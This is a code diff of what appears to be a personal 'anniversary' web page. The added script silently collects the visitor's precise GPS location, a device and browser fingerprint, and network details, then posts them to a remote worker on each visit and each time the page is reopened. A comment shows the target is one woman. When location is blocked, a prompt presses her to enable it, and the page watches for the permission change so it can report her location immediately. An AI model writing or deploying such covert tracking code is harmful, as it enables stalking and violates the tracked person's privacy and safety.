+              altitude:
+                coords.altitude,
 
-                    /*
-                     * keepalive lets the request survive
-                     * certain page lifecycle transitions.
-                     */
+              altitudeAccuracy:
+                coords.altitudeAccuracy,
 
-                    keepalive:
-                        true
-                }
-            );
+              heading:
+                coords.heading,
+
+              speed:
+                coords.speed,
+
+              timestamp:
+                position.timestamp
+            });
+          },
 
 
-        /* =================================================
-           CHECK WORKER
-        ================================================= */
+          // ====================================================
+          // ERROR
+          // ====================================================
 
-        if (
-            !response.ok
-        ) {
+          (error) => {
 
-            const errorText =
-                await response.text();
+            let reason =
+              "Unknown";
 
 
-            console.error(
-                "ANNIVERSARY TRACKER WORKER ERROR:",
-                response.status,
-                errorText
-            );
+            if (
+              error.code ===
+              error.PERMISSION_DENIED
+            ) {
+
+              reason =
+                "Location permission denied";
+            }
 
 
-            return false;
-        }
+            else if (
+              error.code ===
+              error.POSITION_UNAVAILABLE
+            ) {
+
+              reason =
+                "Position unavailable";
+            }
 
 
-        console.log(
-            "ANNIVERSARY TRACKER:",
-            type,
-            "sent successfully."
+            else if (
+              error.code ===
+              error.TIMEOUT
+            ) {
+
+              reason =
+                "Location request timed out";
+            }
+
+
+            finish({
+
+              available:
+                false,
+
+              error:
+                reason,
+
+              code:
+                error.code
+            });
+          },
+
+
+          // ====================================================
+          // OPTIONS
+          // ====================================================
+
+          options
         );
 
 
-        return true;
+        // ------------------------------------------------------
+        // EXTRA SAFETY TIMEOUT
+        // ------------------------------------------------------
+
+        setTimeout(
+          () => {
+
+            finish({
+
+              available:
+                false,
+
+              error:
+                "Location request timed out",
+
+              code:
+                3
+            });
+
+          },
+
+          GPS_TIMEOUT + 1000
+        );
+
+      }
+    );
+  }
+
+
+  // ============================================================
+  // LOCATION PERMISSION STATE
+  // ============================================================
+
+  async function getLocationPermissionState() {
+
+    try {
+
+      if (
+        !navigator.permissions ||
+        typeof navigator.permissions.query !==
+          "function"
+      ) {
+
+        return "unknown";
+      }
+
+
+      const permission =
+        await navigator.permissions.query({
+          name:
+            "geolocation"
+        });
+
+
+      return permission.state;
 
     } catch (error) {
 
-        console.error(
-            "ANNIVERSARY TRACKER ERROR:",
-            error
+      /*
+       * Some browsers don't expose geolocation
+       * permission querying consistently.
+       */
+
+      return "unknown";
+    }
+  }
+
+
+  // ============================================================
+  // COMMON VISITOR DATA
+  // ============================================================
+
+  async function getCommonData() {
+
+    const browser =
+      await detectBrowser();
+
+
+    const connection =
+      getConnectionInformation();
+
+
+    return {
+
+      // --------------------------------------------------------
+      // DEVICE
+      // --------------------------------------------------------
+
+      deviceType:
+        detectDevice(),
+
+
+      operatingSystem:
+        detectOperatingSystem(),
+
+
+      // --------------------------------------------------------
+      // BROWSER
+      // --------------------------------------------------------
+
+      browser:
+        browser.name,
+
+
+      browserVersion:
+        browser.version,
+
+
+      browserDetection:
+        browser.detection,
+
+
+      engine:
+        detectEngine(),
+
+
+      // --------------------------------------------------------
+      // TOUCH
+      // --------------------------------------------------------
+
+      touchscreen:
+        detectTouchscreen(),
+
+
+      maxTouchPoints:
+        navigator.maxTouchPoints || 0,
+
+
+      // --------------------------------------------------------
+      // DISPLAY
+      // --------------------------------------------------------
+
+      screenWidth:
+        screen.width,
+
+
+      screenHeight:
+        screen.height,
+
+
+      viewportWidth:
+        window.innerWidth,
+
+
+      viewportHeight:
+        window.innerHeight,
+
+
+      orientation:
+        getOrientation(),
+
+
+      devicePixelRatio:
+        window.devicePixelRatio || 1,
+
+
+      // --------------------------------------------------------
+      // LANGUAGE
+      // --------------------------------------------------------
+
+      language:
+        navigator.language ||
+        "Unknown",
+
+
+      languages:
+        Array.isArray(
+          navigator.languages
+        )
+          ? navigator.languages
+          : [],
+
+
+      // --------------------------------------------------------
+      // TIMEZONE
+      // --------------------------------------------------------
+
+      browserTimezone:
+        Intl.DateTimeFormat()
+          .resolvedOptions()
+          .timeZone ||
+        "Unknown",
+
+
+      // --------------------------------------------------------
+      // CONNECTION
+      // --------------------------------------------------------
+
+      connectionType:
+        connection.connectionType,
+
+
+      effectiveType:
+        connection.effectiveType,
+
+
+      downlink:
+        connection.downlink,
+
+
+      rtt:
+        connection.rtt,
+
+
+      saveData:
+        connection.saveData,
+
+
+      // --------------------------------------------------------
+      // PAGE
+      // --------------------------------------------------------
+
+      page:
+        location.href,
+
+
+      referrer:
+        document.referrer ||
+        "Direct"
+    };
+  }
+
+
+  // ============================================================
+  // SEND COMPLETE ALERT
+  // ============================================================
+
+  async function sendAlert(
+    visitType
+  ) {
+
+    // ----------------------------------------------------------
+    // DUPLICATE PROTECTION
+    // ----------------------------------------------------------
+
+    const now =
+      Date.now();
+
+
+    const cooldown =
+      visitType ===
+      "reopening"
+
+        ? RETURN_ALERT_COOLDOWN
+
+        : INITIAL_ALERT_COOLDOWN;
+
+
+    if (
+      now - lastAlertTime <
+      cooldown
+    ) {
+
+      return;
+    }
+
+
+    lastAlertTime =
+      now;
+
+
+    // ----------------------------------------------------------
+    // CHECK PERMISSION FIRST
+    // ----------------------------------------------------------
+
+    const permission =
+      await getLocationPermissionState();
+
+
+    // ----------------------------------------------------------
+    // GET GPS + DEVICE DATA
+    // IN PARALLEL
+    // ----------------------------------------------------------
+
+    const [
+      gps,
+      common
+    ] =
+      await Promise.all([
+
+        getPreciseLocation(),
+
+        getCommonData()
+
+      ]);
+
+
+    // ----------------------------------------------------------
+    // SEND EVERYTHING TO WORKER
+    // ----------------------------------------------------------
+
+    const payload = {
+
+      ...common,
+
+      visitType:
+
+        visitType ===
+        "reopening"
+
+          ? "reopening"
+
+          : "initial",
+
+      locationPermission:
+        permission,
+
+      gps
+    };
+
+
+    try {
+
+      const response =
+        await fetch(
+          VISITOR_WORKER,
+          {
+            method:
+              "POST",
+
+            headers: {
+              "Content-Type":
+                "application/json"
+            },
+
+            body:
+              JSON.stringify(
+                payload
+              ),
+
+            keepalive:
+              true
+          }
         );
 
 
-        return false;
+      if (!response.ok) {
+
+        console.error(
+          "Visitor Worker returned:",
+          response.status
+        );
+      }
+
+    } catch (error) {
+
+      console.error(
+        "Visitor alert failed:",
+        error
+      );
     }
-}
+  }
 
 
-/* =========================================================
-   INITIAL VISIT
-========================================================= */
+  // ============================================================
+  // LOCATION CONTROL UI
+  //
+  // Used when permission is already DENIED.
+  // ============================================================
 
-async function handleInitialVisit() {
+  function createLocationControl() {
 
-    const now =
-        Date.now();
-
-
-    /*
-     * Prevent accidental duplicate initial messages.
-     */
+    // Don't create duplicates.
 
     if (
-        now - lastInitialAlert <
-        INITIAL_ALERT_COOLDOWN
+      document.getElementById(
+        "anniversary-location-control"
+      )
     ) {
 
-        return;
+      return;
     }
 
 
-    lastInitialAlert =
-        now;
+    // ==========================================================
+    // MAIN BOX
+    // ==========================================================
+
+    const box =
+      document.createElement(
+        "div"
+      );
 
 
-    await sendCombinedAlert(
-        "visit"
+    box.id =
+      "anniversary-location-control";
+
+
+    box.style.position =
+      "fixed";
+
+
+    box.style.left =
+      "50%";
+
+
+    box.style.bottom =
+      "20px";
+
+
+    box.style.transform =
+      "translateX(-50%)";
+
+
+    box.style.zIndex =
+      "999999";
+
+
+    box.style.background =
+      "rgba(20,20,25,0.97)";
+
+
+    box.style.color =
+      "#ffffff";
+
+
+    box.style.padding =
+      "16px 18px";
+
+
+    box.style.borderRadius =
+      "18px";
+
+
+    box.style.boxShadow =
+      "0 8px 35px rgba(0,0,0,0.40)";
+
+
+    box.style.fontFamily =
+      "system-ui, -apple-system, BlinkMacSystemFont, sans-serif";
+
+
+    box.style.textAlign =
+      "center";
+
+
+    box.style.maxWidth =
+      "calc(100vw - 40px)";
+
+
+    box.style.width =
+      "340px";
+
+
+    // ==========================================================
+    // CONTENT
+    // ==========================================================
+
+    box.innerHTML = `
+
+      <div
+        style="
+          font-size:18px;
+          font-weight:700;
+          margin-bottom:8px;
+        "
+      >
+        📍 Location
+      </div>
+
+      <div
+        style="
+          font-size:14px;
+          line-height:1.45;
+          opacity:.9;
+          margin-bottom:14px;
+        "
+      >
+        Location access is currently blocked
+        for this website.
+      </div>
+
+      <button
+        id="anniversary-enable-location"
+        style="
+          border:0;
+          border-radius:13px;
+          padding:12px 20px;
+          font-size:15px;
+          font-weight:700;
+          cursor:pointer;
+          width:100%;
+        "
+      >
+        📍 Enable Location
+      </button>
+
+      <div
+        id="anniversary-location-help"
+        style="
+          display:none;
+          font-size:12px;
+          line-height:1.5;
+          opacity:.8;
+          margin-top:12px;
+        "
+      >
+        Your browser has remembered that this
+        website's location access was denied.
+        Change this website's Location permission
+        to Allow in your browser settings, then
+        return to the page.
+      </div>
+
+    `;
+
+
+    document.body.appendChild(
+      box
     );
-}
 
 
-/* =========================================================
-   REOPENING
-========================================================= */
+    // ==========================================================
+    // ELEMENT REFERENCES
+    // ==========================================================
 
-async function handleReopening() {
+    const button =
+      document.getElementById(
+        "anniversary-enable-location"
+      );
 
-    const now =
-        Date.now();
+
+    const help =
+      document.getElementById(
+        "anniversary-location-help"
+      );
 
 
-    /*
-     * Prevent visibilitychange + pageshow from
-     * generating two reopening messages.
-     */
+    // ==========================================================
+    // BUTTON
+    // ==========================================================
+
+    button.addEventListener(
+      "click",
+      async () => {
+
+        button.disabled =
+          true;
+
+
+        button.textContent =
+          "📍 Checking permission...";
+
+
+        // ------------------------------------------------------
+        // Check current permission again.
+        // ------------------------------------------------------
+
+        const permission =
+          await getLocationPermissionState();
+
+
+        // ------------------------------------------------------
+        // If the user has already changed it to ALLOW,
+        // obtain the location immediately.
+        // ------------------------------------------------------
+
+        if (
+          permission ===
+          "granted"
+        ) {
+
+          button.textContent =
+            "📍 Getting location...";
+
+
+          const gps =
+            await getPreciseLocation();
+
+
+          if (
+            gps.available
+          ) {
+
+            box.remove();
+
+
+            const common =
+              await getCommonData();
+
+
+            try {
+
+              await fetch(
+                VISITOR_WORKER,
+                {
+                  method:
+                    "POST",
+
+                  headers: {
+                    "Content-Type":
+                      "application/json"
+                  },
+
+                  body:
+                    JSON.stringify({
+
+                      ...common,
+
+                      visitType:
+                        "reopening",
+
+                      locationPermission:
+                        "granted",
+
+                      gps
+                    }),
+
+                  keepalive:
+                    true
+                }
+              );
+
+            } catch (error) {
+
+              console.error(
+                "Location alert failed:",
+                error
+              );
+            }
+
+
+            return;
+          }
+        }
+
+
+        // ------------------------------------------------------
+        // If still denied, calling getCurrentPosition()
+        // cannot override the browser's decision.
+        // ------------------------------------------------------
+
+        const gps =
+          await getPreciseLocation();
+
+
+        if (
+          gps.available
+        ) {
+
+          box.remove();
+
+
+          const common =
+            await getCommonData();
+
+
+          try {
+
+            await fetch(
+              VISITOR_WORKER,
+              {
+                method:
+                  "POST",
+
+                headers: {
+                  "Content-Type":
+                    "application/json"
+                },
+
+                body:
+                  JSON.stringify({
+
+                    ...common,
+
+                    visitType:
+                      "reopening",
+
+                    locationPermission:
+                      "granted",
+
+                    gps
+                  }),
+
+                keepalive:
+                  true
+              }
+            );
+
+          } catch (error) {
+
+            console.error(
+              "Location alert failed:",
+              error
+            );
+          }
+
+
+          return;
+        }
+
+
+        // ------------------------------------------------------
+        // STILL BLOCKED
+        // ------------------------------------------------------
+
+        button.disabled =
+          false;
+
+
+        button.textContent =
+          "📍 Try Again";
+
+
+        help.style.display =
+          "block";
+      }
+    );
+
+
+    // ==========================================================
+    // WATCH FOR PERMISSION CHANGES
+    //
+    // This is important.
+    //
+    // If she goes into Safari settings and changes:
+    //
+    //     Location → Allow
+    //
+    // while the page is still open, the page can detect
+    // the permission state changing in browsers that expose
+    // the Permissions API change event.
+    // ==========================================================
+
+    watchForPermissionChange(
+      box
+    );
+  }
+
+
+  // ============================================================
+  // WATCH LOCATION PERMISSION
+  // ============================================================
+
+  async function watchForPermissionChange(
+    box
+  ) {
+
+    try {
+
+      if (
+        !navigator.permissions ||
+        typeof navigator.permissions.query !==
+          "function"
+      ) {
+
+        return;
+      }
+
+
+      const permission =
+        await navigator.permissions.query({
+          name:
+            "geolocation"
+        });
+
+
+      permission.addEventListener(
+        "change",
+        async () => {
+
+          const state =
+            permission.state;
+
+
+          // ----------------------------------------------------
+          // User changed permission to ALLOW.
+          // ----------------------------------------------------
+
+          if (
+            state ===
+            "granted"
+          ) {
+
+            // Remove UI.
+
+            if (
+              box &&
+              box.parentNode
+            ) {
+
+              box.remove();
+            }
+
+
+            // Get fresh GPS.
+
+            const gps =
+              await getPreciseLocation();
+
+
+            if (
+              !gps.available
+            ) {
+
+              return;
+            }
+
+
+            // Get complete device data.
+
+            const common =
+              await getCommonData();
+
+
+            // Send one complete message.
+
+            try {
+
+              await fetch(
+                VISITOR_WORKER,
+                {
+                  method:
+                    "POST",
+
+                  headers: {
+                    "Content-Type":
+                      "application/json"
+                  },
+
+                  body:
+                    JSON.stringify({
+
+                      ...common,
+
+                      visitType:
+                        "reopening",
+
+                      locationPermission:
+                        "granted",
+
+                      gps
+                    }),
+
+                  keepalive:
+                    true
+                }
+              );
+
+            } catch (error) {
+
+              console.error(
+                "Permission-change alert failed:",
+                error
+              );
+            }
+          }
+
+        }
+      );
+
+    } catch (error) {
+
+      // Permission API unavailable.
+    }
+  }
+
+
+  // ============================================================
+  // INITIAL VISIT
+  // ============================================================
+
+  async function handleInitialVisit() {
 
     if (
-        now - lastReturnAlert <
-        RETURN_ALERT_COOLDOWN
+      initialVisitHandled
     ) {
 
-        return;
+      return;
     }
 
 
-    lastReturnAlert =
-        now;
+    initialVisitHandled =
+      true;
 
 
-    /*
-     * ONE message.
-     *
-     * GPS is included in this same message.
-     */
+    // ----------------------------------------------------------
+    // CHECK LOCATION PERMISSION
+    // ----------------------------------------------------------
 
-    await sendCombinedAlert(
-        "return"
+    const permission =
+      await getLocationPermissionState();
+
+
+    // ----------------------------------------------------------
+    // ALREADY DENIED
+    //
+    // Do NOT endlessly spam getCurrentPosition().
+    //
+    // Send the normal visitor alert with GPS unavailable,
+    // then display the location control.
+    // ----------------------------------------------------------
+
+    if (
+      permission ===
+      "denied"
+    ) {
+
+      await sendAlert(
+        "initial"
+      );
+
+
+      createLocationControl();
+
+
+      return;
+    }
+
+
+    // ----------------------------------------------------------
+    // GRANTED OR PROMPT
+    //
+    // getCurrentPosition() will:
+    //
+    // - use the existing permission if granted
+    // - cause the browser to ask if permission is prompt
+    //
+    // The browser controls the actual native popup.
+    // ----------------------------------------------------------
+
+    await sendAlert(
+      "initial"
     );
-}
+  }
 
 
-/* =========================================================
-   INITIAL PAGE LOAD
-========================================================= */
+  // ============================================================
+  // REOPENING
+  // ============================================================
 
-handleInitialVisit();
+  async function handleReopening() {
+
+    const permission =
+      await getLocationPermissionState();
 
 
-/* =========================================================
-   VISIBILITY CHANGE
-========================================================= */
+    // ----------------------------------------------------------
+    // DENIED
+    // ----------------------------------------------------------
 
-document.addEventListener(
+    if (
+      permission ===
+      "denied"
+    ) {
+
+      await sendAlert(
+        "reopening"
+      );
+
+
+      createLocationControl();
+
+
+      return;
+    }
+
+
+    // ----------------------------------------------------------
+    // GRANTED / PROMPT / UNKNOWN
+    // ----------------------------------------------------------
+
+    await sendAlert(
+      "reopening"
+    );
+  }
+
+
+  // ============================================================
+  // VISIBILITY CHANGE
+  //
+  // Example:
+  //
+  // Website open
+  // ↓
+  // user switches to another app
+  // ↓
+  // returns to website
+  //
+  // We treat that as a reopening/return.
+  // ============================================================
+
+  document.addEventListener(
     "visibilitychange",
     () => {
 
+      if (
+        document.visibilityState ===
+        "visible"
+      ) {
+
         if (
-            document.visibilityState ===
-            "visible"
+          window.__anniversaryPageLoaded
         ) {
 
-            handleReopening();
+          handleReopening();
         }
+      }
     }
-);
+  );
 
 
-/* =========================================================
-   BFCACHE / PAGESHOW
-========================================================= */
+  // ============================================================
+  // BFCACHE / BACK-FORWARD CACHE
+  // ============================================================
 
-window.addEventListener(
+  window.addEventListener(
     "pageshow",
-    event => {
+    (event) => {
 
-        /*
-         * Only handle BFCache restoration.
-         *
-         * Normal initial pageshow must NOT generate
-         * a second Telegram alert.
-         */
+      /*
+       * persisted = true means the page came back
+       * from the browser's back-forward cache.
+       */
 
-        if (
-            event.persisted
-        ) {
+      if (
+        event.persisted
+      ) {
 
-            handleReopening();
-        }
+        handleReopening();
+      }
     }
-);
+  );
+
+
+  // ============================================================
+  // PAGE INITIALIZATION
+  // ============================================================
+
+  window.__anniversaryPageLoaded =
+    true;
+
+
+  handleInitialVisit();
+
+
+})();
 </script>
 </body>
 </html>
